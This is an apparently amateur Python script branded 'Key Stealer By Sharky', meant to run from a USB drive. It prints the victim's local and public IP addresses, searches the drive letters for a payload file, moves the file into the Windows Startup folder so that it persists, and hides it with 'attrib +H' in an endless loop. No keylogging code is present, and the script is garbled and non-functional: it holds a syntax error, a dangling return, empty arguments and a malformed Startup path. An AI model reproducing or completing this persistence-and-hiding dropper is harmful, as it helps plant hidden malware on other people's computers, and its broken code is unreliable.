import os
import time
import subprocess
import socket
import shutil
import string
from requests import get 


# Getting the username of logged in account
user = os.getlogin()

startup_path = "C:\\Users\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"


# Moving files from usb to shell:startup
def add_to_startup(file):
    shutil.move(f"{file}" , "C:\Users\\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
    print("[*] Successfully moved files")


def file_hider(file):
   # Hides a specific python file inside specified folder 
    subprocess.run(["attrib", "+H", f"{file}"])
    print("[*] Successfully hid file")

# Printing ip address
def printIPs():    
    print("[*] Printing IP Addresses")
    start_time = time.time()
    local_ip = socket.gethostbyname(socket.gethostname())
    public_ip = get('https://api.ipify.org').content.decode('utf8')
    print(f"Local IP: {local_ip}\n")
    print(f"Public IP: {public_ip}")
    print("--- %s s ---" % round(time.time() - start_time, 2))



# Printing art
print(r"""
               ...
             ;::::;
           ;::::; :;
         ;:::::'   :;
        ;:::::;     ;.
       ,:::::'       ;           OOO\
       ::::::;       ;          OOOOO\
       ;:::::;       ;         OOOOOOOO\
      ,;::::::;     ;'         / OOOOOOO\
    ;:::::::::`. ,,,;.        /  / DOOOOOO\
  .';:::::::::::::::::;,     /  /     DOOOO\
 ,::::::;::::::;;;;::::;,   /  /        DOOO\
;`::::::`'::::::;;;::::: ,|/  /          DOOO\
:`:::::::`;::::::;;::: ;::|  /            DOOO
::`:::::::`;:::::::: ;::::| /              DOO
`:`:::::::`;:::::: ;::::::|/               DOO
 :::`:::::::`;; ;:::::::::\|                OO
 ::::`:::::::`;::::::::;:::\                OO
 `:::::`::::::::::::;'`:;::|                O
  `:::::`::::::::;' /  / `:|
   ::::::`:::::;'  /  /   `|

 _   __             _____ _             _           
| | / /            /  ___| |           | |          
| |/ /  ___ _   _  \ `--.| |_ ___  __ _| | ___ _ __ 
|    \ / _ \ | | |  `--. \ __/ _ \/ _` | |/ _ \ '__|
| |\  \  __/ |_| | /\__/ / ||  __/ (_| | |  __/ |   
\_| \_/\___|\__, | \____/ \__\___|\__,_|_|\___|_|   
             __/ |                                  
            |___/           By Sharky          


-----------------------------------------------------
                   
""")

printIPs()

while True:
  start = input(" Do you want to start program? y/n: ")
  if start == "y":
      run = True
      break
  elif start == "n":
      run = False
      break
  else:
      print("Please input something valid")

# Finding out what letter the usb is and the payload inside it
for char in string.ascii_uppercase:
    if os.path.exists(f"{char}:\\"):
        print(f"Found {char}:\\")

def directory_searcher(path):
    drive_paths = []
    for char in string.ascii_uppercase:
        if os.path.exists(f"{char}:\\"):
            drive_paths.append(char)
        for letter in drive_paths:
            if os.path.exists(f"{letter}:\\{path}"):
                return 
 r"Users\JohnBradshawCantos\Desktop\mremoveinst.txt"
file = directory_searcher(path=)    
while run:
    print("Starting program...")
    add_to_startup(file="")
    file_hider(file=file)